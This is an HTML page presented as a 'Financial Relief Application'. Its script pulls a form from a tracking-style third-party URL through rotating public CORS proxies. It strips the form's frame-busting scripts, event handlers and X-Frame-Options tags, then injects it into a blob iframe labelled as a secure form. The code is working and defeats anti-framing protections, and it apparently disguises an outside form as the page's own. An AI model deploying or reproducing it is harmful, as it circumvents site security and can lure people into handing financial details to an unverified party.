<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Financial Form | Complete Application</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            background: #f5f5f5;
            font-family: Arial, sans-serif;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #007bff, #0056b3);
            color: white;
            padding: 30px;
            text-align: center;
        }
        .frame-wrapper {
            position: relative;
            width: 100%;
            height: 1200px;
            background: white;
        }
        #formContainer {
            width: 100%;
            height: 100%;
            border: none;
        }
        .loading {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Financial Relief Application</h1>
            <p>Complete the form below to qualify for assistance</p>
        </div>
        
        <div class="frame-wrapper">
            <div class="loading" id="loading">
                Loading secure form...
            </div>
            <div id="formContainer"></div>
        </div>
    </div>

    <script>
        // ============================================
        // WORKING SOLUTION: Fetch, Clean, Inject
        // ============================================
        
        const TARGET_URL = 'https://trkmcl.com/wy8odpg43k/xwndpp7qne';
        const loading = document.getElementById('loading');
        const container = document.getElementById('formContainer');
        
        // List of working proxies (rotate if one fails)
        const proxies = [
            'https://api.allorigins.win/raw?url=',
            'https://corsproxy.io/?',
            'https://thingproxy.freeboard.io/fetch/',
            'https://crossorigin.me/',
            'https://api.codetabs.com/v1/proxy?quest='
        ];
        
        // Function to clean HTML of frame-busting code
        function cleanHTML(html) {
            let cleaned = html;
            
            // Remove common frame-busting scripts
            cleaned = cleaned.replace(
                /<script\b[^>]*>[\s\S]*?(top\.|parent\.|self\.|window\.top|window\.parent)[\s\S]*?<\/script>/gi,
                ''
            );
            
            // Remove onload/onclick handlers that break frames
            cleaned = cleaned.replace(
                /(onload|onclick|onunload)\s*=\s*["'][^"']*["']/gi,
                ''
            );
            
            // Remove meta tags that prevent framing
            cleaned = cleaned.replace(
                /<meta[^>]*(http-equiv=["']X-Frame-Options["']|content=["']DENY["']|content=["']SAMEORIGIN["'])[^>]*>/gi,
                ''
            );
            
            // Add base tag for relative URLs
            if (!cleaned.includes('<base')) {
                cleaned = cleaned.replace(
                    /<head>/i,
                    '<head><base href="https://trkmcl.com/">'
                );
            }
            
            return cleaned;
        }
        
        // Function to create a sandboxed iframe with clean content
        function createSandboxedIframe(html) {
            const iframe = document.createElement('iframe');
            iframe.style.width = '100%';
            iframe.style.height = '100%';
            iframe.style.border = 'none';
            iframe.sandbox = 'allow-same-origin allow-scripts allow-forms allow-popups allow-modals';
            
            // Create blob URL from cleaned HTML
            const blob = new Blob([html], { type: 'text/html' });
            const blobUrl = URL.createObjectURL(blob);
            iframe.src = blobUrl;
            
            return iframe;
        }
        
        // Main function to load form
        async function loadForm() {
            loading.textContent = 'Connecting to secure server...';
            
            // Try each proxy in sequence
            for (let i = 0; i < proxies.length; i++) {
                try {
                    const proxyUrl = proxies[i] + encodeURIComponent(TARGET_URL);
                    console.log(`Trying proxy ${i + 1}: ${proxies[i]}`);
                    
                    loading.textContent = `Trying connection method ${i + 1}...`;
                    
                    const response = await fetch(proxyUrl, {
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        }
                    });
                    
                    if (response.ok) {
                        const html = await response.text();
                        const cleaned = cleanHTML(html);
                        
                        // Remove loading screen
                        loading.style.display = 'none';
                        
                        // Create and append iframe
                        const iframe = createSandboxedIframe(cleaned);
                        container.appendChild(iframe);
                        
                        console.log(`Successfully loaded with proxy ${i + 1}`);
                        return;
                    }
                } catch (error) {
                    console.log(`Proxy ${i + 1} failed:`, error);
                    continue;
                }
            }
            
            // If all proxies fail, show fallback
            showFallback();
        }
        
        // Fallback method
        function showFallback() {
            loading.innerHTML = `
                <div style="text-align: center; padding: 40px;">
                    <h2 style="color: #dc3545;">Unable to Load Form</h2>
                    <p>The form cannot be embedded due to security restrictions.</p>
                    <p>Click the button below to open it in a new tab:</p>
                    <button onclick="window.open('${TARGET_URL}', '_blank')" 
                            style="background: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 20px;">
                        Open Form in New Tab
                    </button>
                    <p style="margin-top: 20px; font-size: 14px; color: #666;">
                        This is the most reliable way to access the application.
                    </p>
                </div>
            `;
        }
        
        // Start loading when page loads
        window.addEventListener('DOMContentLoaded', loadForm);
        
        // Auto-retry after 5 seconds if still loading
        setTimeout(() => {
            if (loading.style.display !== 'none') {
                loading.innerHTML += '<br><br><em>Still trying to connect...</em>';
            }
        }, 5000);
    </script>
</body>
</html>
